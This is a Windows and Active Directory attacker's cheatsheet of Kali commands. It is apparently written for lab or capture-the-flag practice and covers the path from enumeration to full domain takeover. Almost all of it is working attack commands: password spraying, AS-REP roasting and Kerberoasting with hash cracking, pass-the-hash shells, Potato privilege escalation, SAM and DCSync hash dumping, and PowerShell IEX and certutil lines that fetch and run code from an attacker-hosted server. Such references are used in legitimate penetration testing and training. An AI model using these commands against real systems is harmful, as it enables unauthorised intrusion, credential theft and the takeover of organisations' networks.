# Windows / AD Cheatsheet (Linux attacker's quick reference)

A fast lookup for the tools these commands use. All run from Kali. Replace <IP>, <DOMAIN>,
<user>, <pass> accordingly. `nxc` = netexec (the maintained fork of crackmapexec).

## Mental model vs Linux
| Linux box | Windows/AD box |
|-----------|----------------|
| web / SSH foothold | SMB / LDAP / Kerberos / web foothold |
| /etc/passwd, users | domain users via RPC/LDAP null session |
| SUID / sudo -l | token privileges (whoami /priv), service perms |
| cron jobs | scheduled tasks running as SYSTEM |
| kernel exploit | Potato attacks, ACL abuse, kernel (last resort) |
| — | Kerberos: AS-REP roast, Kerberoast, tickets |
| — | domain takeover: DCSync krbtgt |

## Enumeration
```
nxc smb <IP>                                   # host/domain/OS/signing
nxc smb <IP> -u '' -p '' --shares              # null session shares
nxc smb <IP> -u guest -p '' --users --rid-brute# harvest users
enum4linux-ng -A <IP>
rpcclient -U '' -N <IP>   → enumdomusers
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

## Find a foothold cred
```
# AS-REP roast (no creds)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <IP> -format hashcat
hashcat -m 18200 hash.txt rockyou.txt

# Password spray (have a password, want the user)
nxc smb <IP> -u users.txt -p '<Password1>' --continue-on-success
```

## After you have a cred
```
nxc smb <IP> -u <user> -p <pass>               # validate; "Pwn3d!" = local admin
bloodhound-python -u <user> -p <pass> -d <DOMAIN> -ns <IP> -c all
impacket-GetUserSPNs <DOMAIN>/<user>:<pass> -dc-ip <IP> -request   # Kerberoast
hashcat -m 13100 kerberoast.txt rockyou.txt
```

## Get a shell
```
evil-winrm -i <IP> -u <user> -p <pass>         # WinRM (5985) — the go-to
evil-winrm -i <IP> -u <user> -H <NTLM>         # pass-the-hash
impacket-psexec <DOMAIN>/<user>:<pass>@<IP>    # needs local admin
xfreerdp /v:<IP> /u:<user> /p:<pass> +clipboard/dynamic-resolution
```

## Local privesc quick hits
```
whoami /priv                                   # the first thing to check
# SeImpersonatePrivilege present? →
PrintSpoofer64.exe -i -c cmd                   # or GodPotato -cmd "cmd"
# SeBackupPrivilege present? →
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

## Dump hashes / domain takeover
```
impacket-secretsdump <DOMAIN>/<user>:<pass>@<IP>      # remote, if privileged
impacket-secretsdump <DOMAIN>/<user>:<pass>@<IP> -just-dc  # DCSync (needs rights)
# krbtgt hash = full domain compromise
```

## Serving files to the target
```
python3 -m http.server 80                      # on Kali
# on target (PowerShell):
# IEX(New-Object Net.WebClient).DownloadString('http://<tun0>/script.ps1')
# certutil -urlcache -f http://<tun0>/tool.exe tool.exe
```

## The three things that waste the most time
1. **/etc/hosts** — add the DC FQDN → IP. Kerberos fails without it.
2. **Clock skew** — sync to the DC: `sudo rdate -n <IP>` (or ntpdate). >5 min = Kerberos dies.
3. **Missed enum** — re-run share/user enum with every new cred; creds unlock more shares.
```
```
Tools referenced: netexec, impacket, evil-winrm, bloodhound-python, enum4linux-ng,
freerdp, hashcat, certipy. Potato binaries + winPEAS + PowerUp you download to the target.
```
